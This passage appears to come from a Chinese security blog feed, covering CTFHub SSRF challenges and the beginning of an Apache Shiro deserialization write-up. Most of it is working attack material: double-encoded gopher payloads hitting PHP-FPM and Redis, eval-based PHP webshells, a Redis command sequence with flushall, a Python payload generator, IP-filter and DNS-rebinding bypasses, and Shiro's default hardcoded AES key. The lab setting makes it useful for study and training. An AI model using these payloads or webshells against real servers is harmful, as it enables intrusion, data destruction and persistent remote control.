class="language-none">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A72.0%2529%2520Gecko/20100101%2520Firefox/72.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------293582696224464%250D%250AContent-Length%253A%2520313%250D%250AOrigin%253A%2520http%253A//challenge-aee11a9820eee7e2.sandbox.ctfhub.com%253A10080%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-aee11a9820eee7e2.sandbox.ctfhub.com%253A10080/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------293582696224464%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A111%250D%250A-----------------------------293582696224464%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------293582696224464--%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样用index.php 发送过去</p><pre class="line-numbers language-none"><code class="language-none">index.php?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A72.0%2529%2520Gecko/20100101%2520Firefox/72.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------293582696224464%250D%250AContent-Length%253A%2520313%250D%250AOrigin%253A%2520http%253A//challenge-aee11a9820eee7e2.sandbox.ctfhub.com%253A10080%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-aee11a9820eee7e2.sandbox.ctfhub.com%253A10080/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------293582696224464%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A111%250D%250A-----------------------------293582696224464%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%25C3%25A6%25C2%259F%25C2%25A5%25C3%25A8%25C2%25AF%25C2%25A2%250D%250A-----------------------------293582696224464--%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样 成功 拿到了 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102705.png" alt="1616814965637"></p><h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre class="line-numbers language-none"><code class="language-none">FastCGIWikipedia对FastCGI的解释：快速通用网关接口（FastCommon Gateway Interface／FastCGI）是一种让交互程序与Web服务器通信的协议。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。php-fpm官方对php-fpm的解释是FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。也就是说php-fpm是FastCGI的一个具体实现，其默认监听9000端口。php-fpm攻击实现原理想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，CGI 和 FastCGI 协议的运行原理这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个SCRIPT_FILENAME': '/var/www/html/index.php这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。那么当设置php环境变量为：auto_prepend_file = php://input;allow_url_include = On时，就会在执行php脚本之前包含环境变量auto_prepend_file所指向的文件内容，php://input也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。详情请看：https://bbs.ichunqiu.com/thread-58455-1-1.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul><li>libcurl版本&gt;=7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><p>下面我们就利用工具来执行命令，网web目录里面写Webshell</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>使用 Gopherus工具生成攻击FastCGI的payload</p><p>工具下载地址：<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102577.png" alt="image-20211118152652753"></p><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">python gopherus.py --exploit fastcgi/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件echo PD9waHAgQGV2YWwoJF9QT1NUW3ZhbHVlXSk7Pz4= | base64 -d  &gt; /var/www/html/shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH136%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%88%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUW3ZhbHVlXSk7Pz4%3D%20%7C%20base64%20-d%20%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102919.png" alt="image-20211118202106330"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102860.png" alt="image-20211118202129792"></p><p>这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码</p><p>在进行一次Url Encode</p><pre class="line-numbers language-none"><code class="language-none">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH136%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2588%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUW3ZhbHVlXSk7Pz4%253D%2520%257C%2520base64%2520-d%2520%2520%253E%2520%2Fvar%2Fwww%2Fhtml%2Fshell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102507.png" alt="image-20211118202251516"></p><p>执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102840.png" alt="image-20211118202357729"></p><p>蚁剑连接webshell</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102265.png" alt="image-20211118202448406"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102527.png" alt="image-20211118202542072"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102795.png" alt="image-20211118202555540"></p><h2 id="Redis访问"><a href="#Redis访问" class="headerlink" title="Redis访问"></a>Redis访问</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><h3 id="产生点"><a href="#产生点" class="headerlink" title="产生点"></a>产生点</h3><ul><li><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p></li><li><p>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p></li></ul><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</p><p>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</p><p>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p><h3 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102433.png" alt="image-20211118131305083"></p><p>熟悉的界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102257.png" alt="image-20211118131452975"></p><p>目录扫描啥也没有</p><p>既然是Redis，那么应该就是利用SSRF对目标主机上的Redis进行未授权访问攻击。</p><p>探测目标主机开放的端口</p><p>抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102414.png" alt="image-20211118131732470"></p><p>使用dict协议</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102890.png" alt="image-20211118131830815"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182102109.png" alt="image-20211118131924345"></p><p>线程不要太大</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182103191.png" alt="image-20211118131948705"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182103519.png" alt="image-20211118132603265"></p><p>我们在目标主机的6379端口上发现了Redis的报错，说明目标主机上确实运行着Redis服务，并且端口为其默认端口6379。</p><p>利用未授权访问攻击Redis的方法有很多</p><h4 id="redis-SSRF攻击方式"><a href="#redis-SSRF攻击方式" class="headerlink" title="redis+SSRF攻击方式"></a>redis+SSRF攻击方式</h4><ol><li>绝对路径写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><p>以绝对路径写webshell为例子</p><p>这个用的也是最多的，具体可以参考这里：<a href="https://xz.aliyun.com/t/5665">https://xz.aliyun.com/t/5665</a></p><p>构造redis命令</p><pre class="line-numbers language-none"><code class="language-none">flushallset 1 '&lt;?php eval($_POST["a"]);?&gt;'config set dir /var/www/htmlconfig set dbfilename shell.phpsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>贴一个EXP脚本生成符合gopher协议格式的payload：</p><pre class="line-numbers language-none"><code class="language-none">import urllibprotocol="gopher://"ip="127.0.0.1"port="6379"shell="\n\n&lt;?php eval($_POST[\"cmd\"]);?&gt;\n\n"filename="shell.php"path="/var/www/html"passwd=""cmd=["flushall",     "set 1 {}".format(shell.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.quote(redis_format(x))    print urllib.quote(payload) # 由于我们这里是GET，所以要进行两次url编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一下payload</p><pre class="line-numbers language-none"><code class="language-none">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182104256.png" alt="image-20211118210355793"></p><p>把该paylaod用GET方法发送过去</p><p>返回了504 我感觉是服务器的问题</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107382.png" alt="image-20211118204731746"></p><h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107932.png" alt="image-20211118133635958"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107937.png" alt="image-20211118133617361"></p><p>url必须以<code>http://notfound.ctfhub.com</code>开头</p><p>很简单，我们可以利用<code>@</code>来绕过</p><p><code>http://notfound.ctfhub.com@127.0.0.1</code>与<code> http://127.0.0.1</code>请求是相同的，该请求得到的内容都是127.0.0.1的内容</p><p>目录扫描 发现flag.php</p><pre class="line-numbers language-none"><code class="language-none">/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107962.png" alt="image-20211118133917336"></p><h2 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182105919.png" alt="image-20211118133937570"></p><p>熟悉的界面</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106638.png" alt="image-20211118134024431"></p><p>目录扫描 发现<code>flag.php</code></p><p>直接访问它</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106721.png" alt="image-20211118134107206"></p><p>报错了，<code>Just View From 127.0.0.1</code></p><p>构造</p><pre class="line-numbers language-none"><code class="language-none">/?url=http://127.0.0.1/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106965.png" alt="image-20211118134226568"></p><p>报错了，<code>hacker! Ban '/127|172|@/'</code></p><p>上面有提到如何绕过</p><p>进制转换 绕过</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1:八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload</p><pre class="line-numbers language-none"><code class="language-none">/?url=http://2130706433/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106041.png" alt="image-20211118134501232"></p><h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106984.png" alt="image-20211118134541933"></p><p>目录扫描 发现flag.php</p><p>尝试直接访问</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106619.png" alt="image-20211118134636827"></p><p>报错了，<code>Just View From 127.0.0.1</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106119.png" alt="image-20211118134815098"></p><p>报错了，<code>hacker! Ban Intranet IP</code></p><p>在网络上存在一个很神奇的服务，网址为<a href="http://xip.io/">http://xip.io</a></p><p>当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p>当我们访问 <a href="http://127.0.0.1.xip.io/flag.php%EF%BC%8C%E9%82%A3%E4%B9%88%E5%AE%9E%E9%99%85%E4%B8%8A%E6%88%91%E4%BB%AC%E8%AE%BF%E9%97%AE%E7%9A%84%E6%98%AF%E5%B0%B1">http://127.0.0.1.xip.io/flag.php，那么实际上我们访问的是就</a> <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><p>在结合一下</p><pre class="line-numbers language-none"><code class="language-none">http://0.xip.io/flag.phphttp://localhost.xip.io/flag.phphttp://①②⑦.⓪.⓪.①.xip.io/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另一种思路</p><p>利用短地址</p><p>将<code>http://127.0.0.1/flag.php</code>进行缩短</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/flag.phphttps://4m.cn/O4JFr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182106242.png" alt="image-20211118135343534"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107942.png" alt="image-20211118135432435"></p><h2 id="DNS-重绑定-Bypass"><a href="#DNS-重绑定-Bypass" class="headerlink" title="DNS 重绑定 Bypass"></a>DNS 重绑定 Bypass</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107802.png" alt="image-20211118135459200"></p><p>目录扫描</p><p>访问<code>/?url=http://127.0.0.1/flag.php</code></p><p>报错了，<code>hacker! Ban Intranet IP</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107155.png" alt="image-20211118135538394"></p><p>根据提示 使用DNS 重绑定进行绕过</p><p>对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤：</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107093.png" alt="image-20211118135802687"></p><pre class="line-numbers language-none"><code class="language-none">对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：    服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP    对于获得的IP进行判断，发现为非黑名单IP，则通过验证    服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。    由于已经绕过验证，所以服务器端返回访问内网资源的结果。参考：https://www.freebuf.com/articles/web/135342.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于我们无法在程序运行时以毫秒为单位手动更改dns记录，因此需要配置一个自定义DNS服务器，并设定好某些域名的解析IP，再将TTL设置为0，这样后端就不会有缓存。</p><p>推荐这个网站获取一个测试用的域名：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107862.png" alt="image-20211118135926034"></p><p>它只能在2个IP之间随机变化，因此往往需要发送多个请求才能得到想要的结果</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107404.png" alt="image-20211118140241588"></p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/flag.php/?url=7f000001.2f65d296.rbndr.us/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>多刷新几次就好了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107420.png" alt="image-20211118140756194"></p><p>ok 就这样</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF-CTFHUB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro小结</title>
      <link href="/2021/10/28/shiro-xiao-jie/"/>
      <url>/2021/10/28/shiro-xiao-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="Shrio"><a href="#Shrio" class="headerlink" title="Shrio"></a>Shrio</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>维基百科：<a href="https://zh.wikipedia.org/wiki/Apache_Shiro">https://zh.wikipedia.org/wiki/Apache_Shiro</a></p><p>Apache Shiro 是企业常见的Java安全框架，执行身份验证、授权、密码和会话管理</p><p>只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：</p><pre class="line-numbers language-none"><code class="language-none">1、检索RememberMe cookie的值2、Base 64解码3、使用AES解密（加密密钥硬编码）4、进行反序列化操作（未作过滤处理）在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="shiro序列化利用条件"><a href="#shiro序列化利用条件" class="headerlink" title="shiro序列化利用条件"></a>shiro序列化利用条件</h2><p>由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为<code>kPH+bIxk5D2deZiIxcaaaA==</code>，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞</p><p>尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。</p><h2 id="本地搭建"><a href="#本地搭建" class="headerlink" title="本地搭建"></a>本地搭建</h2><h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><pre class="line-numbers language-none"><code class="language-none">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Tomcat安装"><a href="#Tomcat安装" class="headerlink" title="Tomcat安装"></a>Tomcat安装</h3><p>同样是安装java8</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856108.png" alt="image-20210515064238245"></p><p>然后安装Tomcat8</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856110.png" alt="image-20210515064306711"></p><h3 id="部署war包"><a href="#部署war包" class="headerlink" title="部署war包"></a>部署war包</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856111.png" alt="image-20210515064357068"></p><h3 id="启动Tomcat8并访问Shiro"><a href="#启动Tomcat8并访问Shiro" class="headerlink" title="启动Tomcat8并访问Shiro"></a>启动Tomcat8并访问Shiro</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856112.png" alt="image-20210515064451479"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856114.png" alt="image-20210515064605144"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856115.png" alt="image-20210515064753752"></p><h2 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h2><p>使用vulhub </p><pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/shiro/CVE-2016-4437sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856116.png" alt="image-20210515065236330"></p><p>远程访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856117.png" alt="image-20210515065409681"></p><h2 id="Linux出网环境渗透Shiro反序列化漏洞"><a href="#Linux出网环境渗透Shiro反序列化漏洞" class="headerlink" title="Linux出网环境渗透Shiro反序列化漏洞"></a>Linux出网环境渗透Shiro反序列化漏洞</h2><h3 id="Apache-Shiro-反序列化漏洞-CVE-2016-4437"><a href="#Apache-Shiro-反序列化漏洞-CVE-2016-4437" class="headerlink" title="Apache Shiro 反序列化漏洞 (CVE-2016-4437)"></a>Apache Shiro 反序列化漏洞 (CVE-2016-4437)</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>得到rememberMe的cookie值&gt;Base64解码一&gt;AES解密一&gt;反序列化。</p><p>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Shiro&lt;1.2.5版本</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>进行抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856118.png" alt="image-20210515070102340"></p><h2 id="Linux不出网环境渗透Shiro反序列化漏洞"><a href="#Linux不出网环境渗透Shiro反序列化漏洞" class="headerlink" title="Linux不出网环境渗透Shiro反序列化漏洞"></a>Linux不出网环境渗透Shiro反序列化漏洞</h2><p>执行一下py脚本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856119.png" alt="image-20210515071107259"></p><p>分析一下这个脚本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856120.png" alt="image-20210515071528001"></p><p>可以修改延迟 可以修改默认碰撞的key</p><p>执行一下 看看效果</p><h3 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h3><h4 id="拿到shell"><a href="#拿到shell" class="headerlink" title="拿到shell"></a>拿到shell</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110281856121.png" alt="image-20210515071942968"></p><p>跑出了加密密钥 + 